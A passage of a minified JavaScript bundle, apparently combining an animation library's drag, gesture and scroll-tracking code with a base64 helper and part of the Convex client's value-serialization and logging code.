0}updateAxis(t,n,s){const{drag:r}=this.getProps();if(!s||!oo(t,r,this.currentDirection))return;const i=this.getAxisMotionValue(t);let o=this.originPoint[t]+s[t];this.constraints&&this.constraints[t]&&(o=gE(o,this.constraints[t],this.elastic[t])),i.set(o)}resolveConstraints(){var i;const{dragConstraints:t,dragElastic:n}=this.getProps(),s=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):(i=this.visualElement.projection)==null?void 0:i.layout,r=this.constraints;t&&ps(t)?this.constraints||(this.constraints=this.resolveRefConstraints()):t&&s?this.constraints=yE(s.layoutBox,t):this.constraints=!1,this.elastic=xE(n),r!==this.constraints&&!ps(t)&&s&&this.constraints&&!this.hasMutatedConstraints&&Et(o=>{this.constraints!==!1&&this.getAxisMotionValue(o)&&(this.constraints[o]=bE(s.layoutBox[o],this.constraints[o]))})}resolveRefConstraints(){const{dragConstraints:t,onMeasureDragConstraints:n}=this.getProps();if(!t||!ps(t))return!1;const s=t.current,{projection:r}=this.visualElement;if(!r||!r.layout)return!1;r.root&&(r.root.scroll=void 0,r.root.updateScroll());const i=oC(s,r.root,this.visualElement.getTransformPagePoint());let o=wE(r.layout.layoutBox,i);if(n){const a=n(sC(o));this.hasMutatedConstraints=!!a,a&&(o=Tv(a))}return o}startAnimation(t){const{drag:n,dragMomentum:s,dragElastic:r,dragTransition:i,dragSnapToOrigin:o,onDragTransitionEnd:a}=this.getProps(),l=this.constraints||{},c=Et(u=>{if(!oo(u,n,this.currentDirection))return;let d=l&&l[u]||{};(o===!0||o===u)&&(d={min:0,max:0});const h=r?200:1e6,m=r?40:1e7,f={type:"inertia",velocity:s?t[u]:0,bounceStiffness:h,bounceDamping:m,timeConstant:750,restDelta:1,restSpeed:10,...i,...d};return this.startAxisValueAnimation(u,f)});return Promise.all(c).then(a)}startAxisValueAnimation(t,n){const s=this.getAxisMotionValue(t);return xu(this.visualElement,t),s.start(ah(t,s,0,n,this.visualElement,!1))}stopAnimation(){Et(t=>this.getAxisMotionValue(t).stop())}getAxisMotionValue(t){const n=`_drag${t.toUpperCase()}`,r=this.visualElement.getProps()[n];return r||this.visualElement.getValue(t,this.visualElement.latestValues[t]??0)}snapToCursor(t){Et(n=>{const{drag:s}=this.getProps();if(!oo(n,s,this.currentDirection))return;const{projection:r}=this.visualElement,i=this.getAxisMotionValue(n);if(r&&r.layout){const{min:o,max:a}=r.layout.layoutBox[n],l=i.get()||0;i.set(t[n]-H(o,a,.5)+l)}})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;const{drag:t,dragConstraints:n}=this.getProps(),{projection:s}=this.visualElement;if(!ps(n)||!s||!this.constraints)return;this.stopAnimation();const r={x:0,y:0};Et(o=>{const a=this.getAxisMotionValue(o);if(a&&this.constraints!==!1){const l=a.get();r[o]=vE({min:l,max:l},this.constraints[o])}});const{transformTemplate:i}=this.visualElement.getProps();this.visualElement.current.style.transform=i?i({},""):"none",s.root&&s.root.updateScroll(),s.updateLayout(),this.constraints=!1,this.resolveConstraints(),Et(o=>{if(!oo(o,t,null))return;const a=this.getAxisMotionValue(o),{min:l,max:c}=this.constraints[o];a.set(H(l,c,r[o]))}),this.visualElement.render()}addListeners(){if(!this.visualElement.current)return;kE.set(this.visualElement,this);const t=this.visualElement.current,n=Vr(t,"pointerdown",c=>{const{drag:u,dragListener:d=!0}=this.getProps(),h=c.target,m=h!==t&&pC(h);u&&d&&!m&&this.start(c)});let s;const r=()=>{const{dragConstraints:c}=this.getProps();ps(c)&&c.current&&(this.constraints=this.resolveRefConstraints(),s||(s=TE(t,c.current,()=>this.scalePositionWithinConstraints())))},{projection:i}=this.visualElement,o=i.addEventListener("measure",r);i&&!i.layout&&(i.root&&i.root.updateScroll(),i.updateLayout()),B.read(r);const a=pi(window,"resize",()=>this.scalePositionWithinConstraints()),l=i.addEventListener("didUpdate",({delta:c,hasLayoutChanged:u})=>{this.isDragging&&u&&(Et(d=>{const h=this.getAxisMotionValue(d);h&&(this.originPoint[d]+=c[d].translate,h.set(h.get()+c[d].translate))}),this.visualElement.render())});return()=>{a(),n(),o(),l&&l(),s&&s()}}getProps(){const t=this.visualElement.getProps(),{drag:n=!1,dragDirectionLock:s=!1,dragPropagation:r=!1,dragConstraints:i=!1,dragElastic:o=qu,dragMomentum:a=!0}=t;return{...t,drag:n,dragDirectionLock:s,dragPropagation:r,dragConstraints:i,dragElastic:o,dragMomentum:a}}}function mm(e){let t=!0;return()=>{if(t){t=!1;return}e()}}function TE(e,t,n){const s=Au(e,mm(n)),r=Au(t,mm(n));return()=>{s(),r()}}function oo(e,t,n){return(t===!0||t===e)&&(n===null||n===e)}function CE(e,t=10){let n=null;return Math.abs(e.y)>t?n="y":Math.abs(e.x)>t&&(n="x"),n}class AE extends On{constructor(t){super(t),this.removeGroupControls=Ye,this.removeListeners=Ye,this.controls=new SE(t)}mount(){const{dragControls:t}=this.node.getProps();t&&(this.removeGroupControls=t.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||Ye}update(){const{dragControls:t}=this.node.getProps(),{dragControls:n}=this.node.prevProps||{};t!==n&&(this.removeGroupControls(),t&&(this.removeGroupControls=t.subscribe(this.controls)))}unmount(){this.removeGroupControls(),this.removeListeners(),this.controls.isDragging||this.controls.endPanSession()}}const Ul=e=>(t,n)=>{e&&B.update(()=>e(t,n),!1,!0)};class EE extends On{constructor(){super(...arguments),this.removePointerDownListener=Ye}onPointerDown(t){this.session=new cb(t,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:lb(this.node)})}createPanHandlers(){const{onPanSessionStart:t,onPanStart:n,onPan:s,onPanEnd:r}=this.node.getProps();return{onSessionStart:Ul(t),onStart:Ul(n),onMove:Ul(s),onEnd:(i,o)=>{delete this.session,r&&B.postRender(()=>r(i,o))}}}mount(){this.removePointerDownListener=Vr(this.node.current,"pointerdown",t=>this.onPointerDown(t))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}}let zl=!1;class RE extends w.Component{componentDidMount(){const{visualElement:t,layoutGroup:n,switchLayoutGroup:s,layoutId:r}=this.props,{projection:i}=t;i&&(n.group&&n.group.add(i),s&&s.register&&r&&s.register(i),zl&&i.root.didUpdate(),i.addEventListener("animationComplete",()=>{this.safeToRemove()}),i.setOptions({...i.options,layoutDependency:this.props.layoutDependency,onExitComplete:()=>this.safeToRemove()})),Do.hasEverUpdated=!0}getSnapshotBeforeUpdate(t){const{layoutDependency:n,visualElement:s,drag:r,isPresent:i}=this.props,{projection:o}=s;return o&&(o.isPresent=i,t.layoutDependency!==n&&o.setOptions({...o.options,layoutDependency:n}),zl=!0,r||t.layoutDependency!==n||n===void 0||t.isPresent!==i?o.willUpdate():this.safeToRemove(),t.isPresent!==i&&(i?o.promote():o.relegate()||B.postRender(()=>{const a=o.getStack();(!a||!a.members.length)&&this.safeToRemove()}))),null}componentDidUpdate(){const{visualElement:t,layoutAnchor:n}=this.props,{projection:s}=t;s&&(s.options.layoutAnchor=n,s.root.didUpdate(),Js.postRender(()=>{!s.currentAnimation&&s.isLead()&&this.safeToRemove()}))}componentWillUnmount(){const{visualElement:t,layoutGroup:n,switchLayoutGroup:s}=this.props,{projection:r}=t;zl=!0,r&&(r.scheduleCheckAfterUnmount(),n&&n.group&&n.group.remove(r),s&&s.deregister&&s.deregister(r))}safeToRemove(){const{safeToRemove:t}=this.props;t&&t()}render(){return null}}function db(e){const[t,n]=eb(),s=w.useContext(Bd);return p.jsx(RE,{...e,layoutGroup:s,switchLayoutGroup:w.useContext(ob),isPresent:t,safeToRemove:n})}const PE={pan:{Feature:EE},drag:{Feature:AE,ProjectionNode:Zv,MeasureLayout:db}};function gm(e,t,n){const{props:s}=e;e.animationState&&s.whileHover&&e.animationState.setActive("whileHover",n==="Start");const r="onHover"+n,i=s[r];i&&B.postRender(()=>i(t,Pi(t)))}class qE extends On{mount(){const{current:t}=this.node;t&&(this.unmount=cC(t,(n,s)=>(gm(this.node,s,"Start"),r=>gm(this.node,r,"End"))))}unmount(){}}class OE extends On{constructor(){super(...arguments),this.isActive=!1}onFocus(){let t=!1;try{t=this.node.current.matches(":focus-visible")}catch{t=!0}!t||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!1),this.isActive=!1)}mount(){this.unmount=Ai(pi(this.node.current,"focus",()=>this.onFocus()),pi(this.node.current,"blur",()=>this.onBlur()))}unmount(){}}function ym(e,t,n){const{props:s}=e;if(e.current instanceof HTMLButtonElement&&e.current.disabled)return;e.animationState&&s.whileTap&&e.animationState.setActive("whileTap",n==="Start");const r="onTap"+(n==="End"?"":n),i=s[r];i&&B.postRender(()=>i(t,Pi(t)))}class IE extends On{mount(){const{current:t}=this.node;if(!t)return;const{globalTapTarget:n,propagate:s}=this.node.props;this.unmount=mC(t,(r,i)=>(ym(this.node,i,"Start"),(o,{success:a})=>ym(this.node,o,a?"End":"Cancel")),{useGlobalTarget:n,stopPropagation:(s==null?void 0:s.tap)===!1})}unmount(){}}const Ou=new WeakMap,$l=new WeakMap,NE=e=>{const t=Ou.get(e.target);t&&t(e)},jE=e=>{e.forEach(NE)};function ME({root:e,...t}){const n=e||document;$l.has(n)||$l.set(n,{});const s=$l.get(n),r=JSON.stringify(t);return s[r]||(s[r]=new IntersectionObserver(jE,{root:e,...t})),s[r]}function LE(e,t,n){const s=ME(t);return Ou.set(e,n),s.observe(e),()=>{Ou.delete(e),s.unobserve(e)}}const DE={some:0,all:1};class _E extends On{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){var l;(l=this.stopObserver)==null||l.call(this);const{viewport:t={}}=this.node.getProps(),{root:n,margin:s,amount:r="some",once:i}=t,o={root:n?n.current:void 0,rootMargin:s,threshold:typeof r=="number"?r:DE[r]},a=c=>{const{isIntersecting:u}=c;if(this.isInView===u||(this.isInView=u,i&&!u&&this.hasEnteredView))return;u&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive("whileInView",u);const{onViewportEnter:d,onViewportLeave:h}=this.node.getProps(),m=u?d:h;m&&m(c)};this.stopObserver=LE(this.node.current,o,a)}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>"u")return;const{props:t,prevProps:n}=this.node;["amount","margin","root"].some(FE(t,n))&&this.startObserver()}unmount(){var t;(t=this.stopObserver)==null||t.call(this),this.hasEnteredView=!1,this.isInView=!1}}function FE({viewport:e={}},{viewport:t={}}={}){return n=>e[n]!==t[n]}const BE={inView:{Feature:_E},tap:{Feature:IE},focus:{Feature:OE},hover:{Feature:qE}},VE={layout:{ProjectionNode:Zv,MeasureLayout:db}},WE={...dE,...BE,...PE,...VE},L=oE(WE,aE);function UE(e,t,n){w.useInsertionEffect(()=>e.on(t,n),[e,t,n])}function Sa(e){return typeof window>"u"?!1:e?lv():ih()}const zE=50,wm=()=>({current:0,offset:[],progress:0,scrollLength:0,targetOffset:0,targetLength:0,containerLength:0,velocity:0}),$E=()=>({time:0,x:wm(),y:wm()}),HE={x:{length:"Width",position:"Left"},y:{length:"Height",position:"Top"}};function vm(e,t,n,s){const r=n[t],{length:i,position:o}=HE[t],a=r.current,l=n.time;r.current=Math.abs(e[`scroll${o}`]),r.scrollLength=e[`scroll${i}`]-e[`client${i}`],r.offset.length=0,r.offset[0]=0,r.offset[1]=r.scrollLength,r.progress=Xs(0,r.scrollLength,r.current);const c=s-l;r.velocity=c>zE?0:zd(r.current-a,c)}function QE(e,t,n){vm(e,"x",t,n),vm(e,"y",t,n),t.time=n}function GE(e,t){const n={x:0,y:0};let s=e;for(;s&&s!==t;)if(Fr(s))n.x+=s.offsetLeft,n.y+=s.offsetTop,s=s.offsetParent;else if(s.tagName==="svg"){const r=s.getBoundingClientRect();s=s.parentElement;const i=s.getBoundingClientRect();n.x+=r.left-i.left,n.y+=r.top-i.top}else if(s instanceof SVGGraphicsElement){const{x:r,y:i}=s.getBBox();n.x+=r,n.y+=i;let o=null,a=s.parentNode;for(;!o;)a.tagName==="svg"&&(o=a),a=s.parentNode;s=o}else break;return n}const Iu={start:0,center:.5,end:1};function bm(e,t,n=0){let s=0;if(e in Iu&&(e=Iu[e]),typeof e=="string"){const r=parseFloat(e);e.endsWith("px")?s=r:e.endsWith("%")?e=r/100:e.endsWith("vw")?s=r/100*document.documentElement.clientWidth:e.endsWith("vh")?s=r/100*document.documentElement.clientHeight:e=r}return typeof e=="number"&&(s=t*e),n+s}const KE=[0,0];function YE(e,t,n,s){let r=Array.isArray(e)?e:KE,i=0,o=0;return typeof e=="number"?r=[e,e]:typeof e=="string"&&(e=e.trim(),e.includes(" ")?r=e.split(" "):r=[e,Iu[e]?e:"0"]),i=bm(r[0],n,s),o=bm(r[1],t),i-o}const Cr={Enter:[[0,1],[1,1]],Exit:[[0,0],[1,0]],Any:[[1,0],[0,1]],All:[[0,0],[1,1]]},XE={x:0,y:0};function JE(e){return"getBBox"in e&&e.tagName!=="svg"?e.getBBox():{width:e.clientWidth,height:e.clientHeight}}function ZE(e,t,n){const{offset:s=Cr.All}=n,{target:r=e,axis:i="y"}=n,o=i==="y"?"height":"width",a=r!==e?GE(r,e):XE,l=r===e?{width:e.scrollWidth,height:e.scrollHeight}:JE(r),c={width:e.clientWidth,height:e.clientHeight};t[i].offset.length=0;let u=!t[i].interpolate;const d=s.length;for(let h=0;h<d;h++){const m=YE(s[h],c[o],l[o],a[i]);!u&&m!==t[i].interpolatorOffsets[h]&&(u=!0),t[i].offset[h]=m}u&&(t[i].interpolate=eh(t[i].offset,ev(s),{clamp:!1}),t[i].interpolatorOffsets=[...t[i].offset]),t[i].progress=ut(0,1,t[i].interpolate(t[i].current))}function eR(e,t=e,n){if(n.x.targetOffset=0,n.y.targetOffset=0,t!==e){let s=t;for(;s&&s!==e;)n.x.targetOffset+=s.offsetLeft,n.y.targetOffset+=s.offsetTop,s=s.offsetParent}n.x.targetLength=t===e?t.scrollWidth:t.clientWidth,n.y.targetLength=t===e?t.scrollHeight:t.clientHeight,n.x.containerLength=e.clientWidth,n.y.containerLength=e.clientHeight}function tR(e,t,n,s={}){return{measure:r=>{eR(e,s.target,n),QE(e,n,r),(s.offset||s.target)&&ZE(e,n,s)},notify:()=>t(n)}}const ds=new WeakMap,xm=new WeakMap,Hl=new WeakMap,km=new WeakMap,ao=new WeakMap,Sm=e=>e===document.scrollingElement?window:e;function hb(e,{container:t=document.scrollingElement,trackContentSize:n=!1,...s}={}){if(!t)return Ye;let r=Hl.get(t);r||(r=new Set,Hl.set(t,r));const i=$E(),o=tR(t,e,i,s);if(r.add(o),!ds.has(t)){const l=()=>{for(const h of r)h.measure(ce.timestamp);B.preUpdate(c)},c=()=>{for(const h of r)h.notify()},u=()=>B.read(l);ds.set(t,u);const d=Sm(t);window.addEventListener("resize",u),t!==document.documentElement&&xm.set(t,Au(t,u)),d.addEventListener("scroll",u),u()}if(n&&!ao.has(t)){const l=ds.get(t),c={width:t.scrollWidth,height:t.scrollHeight};km.set(t,c);const u=()=>{const h=t.scrollWidth,m=t.scrollHeight;(c.width!==h||c.height!==m)&&(l(),c.width=h,c.height=m)},d=B.read(u,!0);ao.set(t,d)}const a=ds.get(t);return B.read(a,!1,!0),()=>{var d;We(a);const l=Hl.get(t);if(!l||(l.delete(o),l.size))return;const c=ds.get(t);ds.delete(t),c&&(Sm(t).removeEventListener("scroll",c),(d=xm.get(t))==null||d(),window.removeEventListener("resize",c));const u=ao.get(t);u&&(We(u),ao.delete(t)),km.delete(t)}}const nR=[[Cr.Enter,"entry"],[Cr.Exit,"exit"],[Cr.Any,"cover"],[Cr.All,"contain"]],Tm={start:0,end:1};function sR(e){const t=e.trim().split(/\s+/);if(t.length!==2)return;const n=Tm[t[0]],s=Tm[t[1]];if(!(n===void 0||s===void 0))return[n,s]}function rR(e){if(e.length!==2)return;const t=[];for(const n of e)if(Array.isArray(n))t.push(n);else if(typeof n=="string"){const s=sR(n);if(!s)return;t.push(s)}else return;return t}function iR(e,t){const n=rR(e);if(!n)return!1;for(let s=0;s<2;s++){const r=n[s],i=t[s];if(r[0]!==i[0]||r[1]!==i[1])return!1}return!0}function vh(e){if(!e)return{rangeStart:"contain 0%",rangeEnd:"contain 100%"};for(const[t,n]of nR)if(iR(e,t))return{rangeStart:`${n} 0%`,rangeEnd:`${n} 100%`}}const Cm=new Map;function Am(e){const t={value:0},n=hb(s=>{t.value=s[e.axis].progress*100},e);return{currentTime:t,cancel:n}}function pb({source:e,container:t,...n}){const{axis:s}=n;e&&(t=e);let r=Cm.get(t);r||(r=new Map,Cm.set(t,r));const i=n.target??"self";let o=r.get(i);o||(o={},r.set(i,o));const a=s+(n.offset??[]).join(",");return o[a]||(n.target&&Sa(n.target)?vh(n.offset)?o[a]=new ViewTimeline({subject:n.target,axis:s}):o[a]=Am({container:t,...n}):Sa()?o[a]=new ScrollTimeline({source:t,axis:s}):o[a]=Am({container:t,...n})),o[a]}function oR(e,t){const n=pb(t),s=t.target?vh(t.offset):void 0,r=t.target?Sa(t.target)&&!!s:Sa();return e.attachTimeline({timeline:r?n:void 0,...s&&r&&{rangeStart:s.rangeStart,rangeEnd:s.rangeEnd},observe:i=>(i.pause(),Nv(o=>{i.time=i.iterationDuration*o},n))})}function aR(e){return e&&(e.target||e.offset)}function lR(e){return e.length===2}function cR(e,t){return lR(e)||aR(t)?hb(n=>{e(n[t.axis].progress,n)},t):Nv(e,pb(t))}function fb(e,{axis:t="y",container:n=document.scrollingElement,...s}={}){if(!n)return Ye;const r={axis:t,container:n,...s};return typeof e=="function"?cR(e,r):oR(e,r)}const uR=()=>({scrollX:yt(0),scrollY:yt(0),scrollXProgress:yt(0),scrollYProgress:yt(0)}),qs=e=>e?!e.current:!1;function Em(e,t,n,s){return{factory:r=>{let i;const o=()=>{if(qs(n)||qs(s)){Js.read(o);return}i=fb(r,{...t,axis:e,container:(n==null?void 0:n.current)||void 0,target:(s==null?void 0:s.current)||void 0})};return Js.read(o),()=>{Rv(o),i==null||i()}},times:[0,1],keyframes:[0,1],ease:r=>r,duration:1}}function dR(e,t){return typeof window>"u"?!1:e?lv()&&!!vh(t):ih()}function mb({container:e,target:t,...n}={}){const s=Cn(uR);dR(t,n.offset)&&(s.scrollXProgress.accelerate=Em("x",n,e,t),s.scrollYProgress.accelerate=Em("y",n,e,t));const r=w.useRef(null),i=w.useRef(!1),o=w.useCallback(()=>(r.current=fb((a,{x:l,y:c})=>{s.scrollX.set(l.current),s.scrollXProgress.set(l.progress),s.scrollY.set(c.current),s.scrollYProgress.set(c.progress)},{...n,container:(e==null?void 0:e.current)||void 0,target:(t==null?void 0:t.current)||void 0}),()=>{var a;(a=r.current)==null||a.call(r)}),[e,t,JSON.stringify(n.offset)]);return Ys(()=>{if(i.current=!1,qs(e)||qs(t)){i.current=!0;return}else return o()},[o]),w.useEffect(()=>{if(!i.current)return;let a;const l=()=>{const c=qs(e),u=qs(t);!c&&!u&&(a=o())};return Js.read(l),()=>{Rv(l),a==null||a()}},[o]),s}function Lt(e){const t=Cn(()=>yt(e)),{isStatic:n}=w.useContext(ar);if(n){const[,s]=w.useState(e);w.useEffect(()=>t.on("change",s),[])}return t}function gb(e,t){const n=Lt(t()),s=()=>n.set(t());return s(),Ys(()=>{const r=()=>B.preRender(s,!1,!0),i=e.map(o=>o.on("change",r));return()=>{i.forEach(o=>o()),We(s)}}),n}function hR(e){_r.current=[],e();const t=gb(_r.current,e);return _r.current=void 0,t}function Xn(e,t,n,s){if(typeof e=="function")return hR(e);if(n!==void 0&&!Array.isArray(n)&&typeof t!="function")return pR(e,t,n,s);const o=typeof t=="function"?t:CC(t,n,s),a=Array.isArray(e)?Rm(e,o):Rm([e],([c])=>o(c)),l=Array.isArray(e)?void 0:e.accelerate;return l&&!l.isTransformed&&typeof t!="function"&&Array.isArray(n)&&(s==null?void 0:s.clamp)!==!1&&(a.accelerate={...l,times:t,keyframes:n,isTransformed:!0}),a}function Rm(e,t){const n=Cn(()=>[]);return gb(e,()=>{n.length=0;const s=e.length;for(let r=0;r<s;r++)n[r]=e[r].get();return t(n)})}function pR(e,t,n,s){const r=Cn(()=>Object.keys(n)),i=Cn(()=>({}));for(const o of r)i[o]=Xn(e,t,n[o],s);return i}function fR(e,t={}){const{isStatic:n}=w.useContext(ar),s=()=>me(e)?e.get():e;if(n)return Xn(s);const r=Lt(s());return w.useInsertionEffect(()=>EC(r,e,t),[r,JSON.stringify(t)]),r}function kn(e,t={}){return fR(e,{type:"spring",...t})}function mR(e){const t=w.useRef(0),{isStatic:n}=w.useContext(ar);w.useEffect(()=>{if(n)return;const s=({timestamp:r,delta:i})=>{t.current||(t.current=r),e(r-t.current,i)};return B.update(s,!0),()=>We(s)},[e])}function gR(){!mh.current&&Mv();const[e]=w.useState(va.current);return e}var Ot=[],nt=[],yR=Uint8Array,Ql="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";for(var hs=0,wR=Ql.length;hs<wR;++hs)Ot[hs]=Ql[hs],nt[Ql.charCodeAt(hs)]=hs;nt[45]=62;nt[95]=63;function vR(e){var t=e.length;if(t%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var n=e.indexOf("=");n===-1&&(n=t);var s=n===t?0:4-n%4;return[n,s]}function bR(e,t,n){return(t+n)*3/4-n}function fi(e){var t,n=vR(e),s=n[0],r=n[1],i=new yR(bR(e,s,r)),o=0,a=r>0?s-4:s,l;for(l=0;l<a;l+=4)t=nt[e.charCodeAt(l)]<<18|nt[e.charCodeAt(l+1)]<<12|nt[e.charCodeAt(l+2)]<<6|nt[e.charCodeAt(l+3)],i[o++]=t>>16&255,i[o++]=t>>8&255,i[o++]=t&255;return r===2&&(t=nt[e.charCodeAt(l)]<<2|nt[e.charCodeAt(l+1)]>>4,i[o++]=t&255),r===1&&(t=nt[e.charCodeAt(l)]<<10|nt[e.charCodeAt(l+1)]<<4|nt[e.charCodeAt(l+2)]>>2,i[o++]=t>>8&255,i[o++]=t&255),i}function xR(e){return Ot[e>>18&63]+Ot[e>>12&63]+Ot[e>>6&63]+Ot[e&63]}function kR(e,t,n){for(var s,r=[],i=t;i<n;i+=3)s=(e[i]<<16&16711680)+(e[i+1]<<8&65280)+(e[i+2]&255),r.push(xR(s));return r.join("")}function mi(e){for(var t,n=e.length,s=n%3,r=[],i=16383,o=0,a=n-s;o<a;o+=i)r.push(kR(e,o,o+i>a?a:o+i));return s===1?(t=e[n-1],r.push(Ot[t>>2]+Ot[t<<4&63]+"==")):s===2&&(t=(e[n-2]<<8)+e[n-1],r.push(Ot[t>>10]+Ot[t>>4&63]+Ot[t<<2&63]+"=")),r.join("")}function Le(e){if(e===void 0)return{};if(!wb(e))throw new Error(`The arguments to a Convex function must be an object. Received: ${e}`);return e}function yb(e){if(typeof e>"u")throw new Error("Client created with undefined deployment address. If you used an environment variable, check that it's set.");if(typeof e!="string")throw new Error(`Invalid deployment address: found ${e}".`);if(!(e.startsWith("http:")||e.startsWith("https:")))throw new Error(`Invalid deployment address: Must start with "https://" or "http://". Found "${e}".`);try{new URL(e)}catch{throw new Error(`Invalid deployment address: "${e}" is not a valid URL. If you believe this URL is correct, use the \`skipConvexDeploymentUrlCheck\` option to bypass this.`)}if(e.endsWith(".convex.site"))throw new Error(`Invalid deployment address: "${e}" ends with .convex.site, which is used for HTTP Actions. Convex deployment URLs typically end with .convex.cloud? If you believe this URL is correct, use the \`skipConvexDeploymentUrlCheck\` option to bypass this.`)}function wb(e){var r;const t=typeof e=="object",n=Object.getPrototypeOf(e),s=n===null||n===Object.prototype||((r=n==null?void 0:n.constructor)==null?void 0:r.name)==="Object";return t&&s}const vb=!0,Zs=BigInt("-9223372036854775808"),bh=BigInt("9223372036854775807"),Nu=BigInt("0"),SR=BigInt("8"),TR=BigInt("256"),Gl="This commit timestamp is unresolved: its value is assigned when the mutation commits. Read the document after the mutation completes to get its value.";class bb{[Symbol.toPrimitive](t){if(t==="string")return this.toString();throw new Error(Gl)}valueOf(){throw new Error(Gl)}toJSON(){throw new Error(Gl)}toString(){return"[unresolved commit timestamp]"}}const CR=new bb;function xb(e){return Number.isNaN(e)||!Number.isFinite(e)||Object.is(e,-0)}function AR(e){e<Nu&&(e-=Zs+Zs);let t=e.toString(16);t.length%2===1&&(t="0"+t);const n=new Uint8Array(new ArrayBuffer(8));let s=0;for(const r of t.match(/.{2}/g).reverse())n.set([parseInt(r,16)],s++),e>>=SR;return mi(n)}function ER(e){const t=fi(e);if(t.byteLength!==8)throw new Error(`Received ${t.byteLength} bytes, expected 8 for $integer`);let n=Nu,s=Nu;for(const r of t)n+=BigInt(r)*TR**s,s++;return n>bh&&(n+=Zs+Zs),n}function RR(e){if(e<Zs||bh<e)throw new Error(`BigInt ${e} does not fit into a 64-bit signed integer.`);const t=new ArrayBuffer(8);return new DataView(t).setBigInt64(0,e,!0),mi(new Uint8Array(t))}function PR(e){const t=fi(e);if(t.byteLength!==8)throw new Error(`Received ${t.byteLength} bytes, expected 8 for $integer`);return new DataView(t.buffer).getBigInt64(0,!0)}const qR=DataView.prototype.setBigInt64?RR:AR,OR=DataView.prototype.getBigInt64?PR:ER,Pm=1024;function kb(e){if(e.length>Pm)throw new Error(`Field name ${e} exceeds maximum field name length ${Pm}.`);if(e.startsWith("$"))throw new Error(`Field name ${e} starts with a '$', which is reserved.`);for(let t=0;t<e.length;t+=1){const n=e.charCodeAt(t);if(n<32||n>=127)throw new Error(`Field name ${e} has invalid character '${e[t]}': Field names can only contain non-control ASCII characters`)}}function wt(e){if(e===null||typeof e=="boolean"||typeof e=="number"||typeof e=="string")return e;if(Array.isArray(e))return e.map(s=>wt(s));if(typeof e!="object")throw new Error(`Unexpected type of ${e}`);const t=Object.entries(e);if(t.length===1){const s=t[0][0];if(s==="$bytes"){if(typeof e.$bytes!="string")throw new Error(`Malformed $bytes field on ${e}`);return fi(e.$bytes).buffer}if(s==="$integer"){if(typeof e.$integer!="string")throw new Error(`Malformed $integer field on ${e}`);return OR(e.$integer)}if(s==="$float"){if(typeof e.$float!="string")throw new Error(`Malformed $float field on ${e}`);const r=fi(e.$float);if(r.byteLength!==8)throw new Error(`Received ${r.byteLength} bytes, expected 8 for $float`);const o=new DataView(r.buffer).getFloat64(0,vb);if(!xb(o))throw new Error(`Float ${o} should be encoded as a number`);return o}if(s==="$commitTs"){if(e.$commitTs!==null)throw new Error(`Malformed $commitTs field on ${e}`);return CR}if(s==="$set")throw new Error("Received a Set which is no longer supported as a Convex type.");if(s==="$map")throw new Error("Received a Map which is no longer supported as a Convex type.")}const n={};for(const[s,r]of Object.entries(e))kb(s),n[s]=wt(r);return n}const qm=16384;function Wr(e){const t=JSON.stringify(e,(n,s)=>s===void 0?"undefined":typeof s=="bigint"?`${s.toString()}n`:s);if(t.length>qm){const n="[...truncated]";let s=qm-n.length;const r=t.codePointAt(s-1);return r!==void 0&&r>65535&&(s-=1),t.substring(0,s)+n}return t}function ju(e,t,n,s){var o;if(e===void 0){const a=n&&` (present at path ${n} in original object ${Wr(t)})`;throw new Error(`undefined is not a valid Convex value${a}. To learn about Convex's supported types, see https://docs.convex.dev/using/types.`)}if(e===null)return e;if(typeof e=="bigint"){if(e<Zs||bh<e)throw new Error(`BigInt ${e} does not fit into a 64-bit signed integer.`);return{$integer:qR(e)}}if(typeof e=="number")if(xb(e)){const a=new ArrayBuffer(8);return new DataView(a).setFloat64(0,e,vb),{$float:mi(new Uint8Array(a))}}else return e;if(typeof e=="boolean"||typeof e=="string")return e;if(e instanceof ArrayBuffer)return{$bytes:mi(new Uint8Array(e))};if(e instanceof bb)return{$commitTs:null};if(Array.isArray(e))return e.map((a,l)=>ju(a,t,n+`[${l}]`));if(e instanceof Set)throw new Error(Kl(n,"Set",[...e],t));if(e instanceof Map)throw new Error(Kl(n,"Map",[...e],t));if(!wb(e)){const a=(o=e==null?void 0:e.constructor)==null?void 0:o.name,l=a?`${a} `:"";throw new Error(Kl(n,l,e,t))}const r={},i=Object.entries(e);i.sort(([a,l],[c,u])=>a===c?0:a<c?-1:1);for(const[a,l]of i)l!==void 0&&(kb(a),r[a]=ju(l,t,n+`.${a}`));return r}function Kl(e,t,n,s){return e?`${t}${Wr(n)} is not a supported Convex type (present at path ${e} in original object ${Wr(s)}). To learn about Convex's supported types, see https://docs.convex.dev/using/types.`:`${t}${Wr(n)} is not a supported Convex type.`}function _e(e){return ju(e,e,"")}var IR=Object.defineProperty,NR=(e,t,n)=>t in e?IR(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,Yl=(e,t,n)=>NR(e,typeof t!="symbol"?t+"":t,n),Om,Im;const jR=Symbol.for("ConvexError");class $n extends(Im=Error,Om=jR,Im){constructor(t){super(typeof t=="string"?t:Wr(t)),Yl(this,"name","ConvexError"),Yl(this,"data"),Yl(this,Om,!0),this.data=t}}const Sb=()=>Array.from({length:4},()=>0);Sb();Sb();const Fn="1.45.0";var MR=Object.defineProperty,LR=(e,t,n)=>t in e?MR(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,Nm=(e,t,n)=>LR(e,typeof t!="symbol"?t+"":t,n);const DR="color:rgb(0, 145, 255)";function Tb(e){switch(e){case"query":return"Q";case"mutation":return"M";case"action":return"A";case"any":return"?"}}class Cb{constructor(t){Nm(this,"_onLogLineFuncs"),Nm(this,"_verbose"),this._onLogLineFuncs={},this._verbose=t.verbose}addLogLineListener(t){let n=Math.random().toString(36).substring(2,15);for(let s=0;s<10&&this._onLogLineFuncs[n]!==void 